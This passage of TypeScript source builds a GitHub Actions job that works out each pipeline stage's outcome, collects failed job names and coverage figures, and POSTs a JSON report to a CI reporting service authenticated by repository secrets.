 * The quality stage populates `results.coverage` from the upstream test job's
 * `coverage-percent` output and the branch-policy `coverage-threshold` output.
 * Both are passed via env vars and validated as numeric before inclusion so an
 * absent or "unknown" value never corrupts the payload. All other stages send
 * an empty `results: {}`.
 *
 * Stage conclusion is derived from the upstream `needs.*.result` context (not
 * `job.status`, which only reflects this reporting job's own outcome).
 */
function reportingJob(
  stage: WorkflowStage,
  needs: string[],
  opts?: { testJobId?: string },
) {
  const isQuality = stage === 'quality';
  const testJobId = opts?.testJobId;

  // env vars injected into the step — NO ${{ }} inside the run: script
  const stepEnv: Record<string, string> = {
    ALPHACI_TOKEN: '${{ secrets.ALPHACI_TOKEN }}',
    ALPHACI_REPORT_URL: '${{ secrets.ALPHACI_REPORT_URL }}',
    GH_REPO: '${{ github.repository }}',
    GH_BRANCH: `\${{ ${BRANCH_EXPR} }}`,
    GH_SHA: HEAD_SHA_EXPR,
    GH_RUN_ID: '${{ github.run_id }}',
    GITHUB_TOKEN: '${{ github.token }}',
    STAGE_FAILED: "${{ contains(needs.*.result, 'failure') }}",
    STAGE_CANCELLED: "${{ contains(needs.*.result, 'cancelled') }}",
  };

  if (isQuality && testJobId) {
    stepEnv['COVERAGE_PCT'] =
      `\${{ needs.${testJobId}.outputs.coverage-percent }}`;
    stepEnv['COVERAGE_THRESHOLD'] =
      '${{ needs.branch-policy.outputs.coverage-threshold }}';
  }

  const scriptLines = [
    '# Derive stage conclusion from upstream needs results',
    'if [ "$STAGE_FAILED" = "true" ]; then',
    '  CONCLUSION="failure"',
    'elif [ "$STAGE_CANCELLED" = "true" ]; then',
    '  CONCLUSION="cancelled"',
    'else',
    '  CONCLUSION="success"',
    'fi',
    '',
    '# Report the failed GitHub job name so ALPHACI can give a specific fix',
    'FAILED_JOBS=""',
    'if [ "$CONCLUSION" = "failure" ]; then',
    '  FAILED_JOBS=$(curl -sf --max-time 5 -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GH_REPO/actions/runs/$GH_RUN_ID/jobs?filter=latest" | jq -r \'.jobs[] | select(.conclusion == "failure") | "Failed GitHub Actions job: \\(.name)"\' | head -n 5 || true)',
    'fi',
    '',
    '# Build results sub-object (quality stage only — reads from job outputs)',
    'RESULTS="{}"',
    ...(isQuality && testJobId
      ? [
          '',
          '# Include coverage only when COVERAGE_PCT is a real number',
          '# (central workflows emit "unknown" when coverage is not available)',
          'if echo "$COVERAGE_PCT" | grep -qE \'^[0-9]+([.][0-9]+)?$\'; then',
          '  RESULTS=$(jq -n \\',
          '    --argjson pct "$COVERAGE_PCT" \\',
          '    --argjson threshold "${COVERAGE_THRESHOLD:-0}" \\',
          '    \'{"coverage":{"pct":$pct,"threshold":$threshold}}\')',
          'fi',
        ]
      : []),
    '',
    '# Build and POST the payload with jq — no string interpolation of context values',
    'PAYLOAD=$(jq -n \\',
    '  --arg repo     "$GH_REPO" \\',
    '  --arg branch   "$GH_BRANCH" \\',
    '  --arg sha      "$GH_SHA" \\',
    '  --argjson runId "$GH_RUN_ID" \\',
    `  --arg stage    "${stage}" \\`,
    '  --arg conclusion "$CONCLUSION" \\',
    '  --arg rawLogs "$FAILED_JOBS" \\',
    '  --argjson results "$RESULTS" \\',
    "  '{repoFullName:$repo,branch:$branch,commitSha:$sha,runId:$runId,stage:$stage,conclusion:$conclusion,results:$results,rawLogs:$rawLogs}')",
    'curl -sf --max-time 5 \\',
    '  -X POST "$ALPHACI_REPORT_URL" \\',
    '  -H "Authorization: Bearer $ALPHACI_TOKEN" \\',
    '  -H "Content-Type: application/json" \\',
    '  -d "$PAYLOAD" \\',
    '  || echo "::warning::Failed to report pipeline results to ALPHACI"',
  ];

  return {
    if: '${{ always() }}',
    needs,
    runs_on: 'ubuntu-latest',
    env: {
      ALPHACI_TOKEN: '${{ secrets.ALPHACI_TOKEN }}',
      ALPHACI_REPORT_URL: '${{ secrets.ALPHACI_REPORT_URL }}',
    },
    steps: [
      {
        name: 'Report stage results to ALPHACI',
        env: stepEnv,
        run: scriptLines.join('\n'),
      },
    ],
  };
}

function dumpWorkflow(workflow: Record<string, unknown>): string {
  return yaml
    .dump(workflow, {
      lineWidth: -1,
      noRefs: true,
      sortKeys: false,
    })
    .replaceAll('runs_on:', 'runs-on:');
}
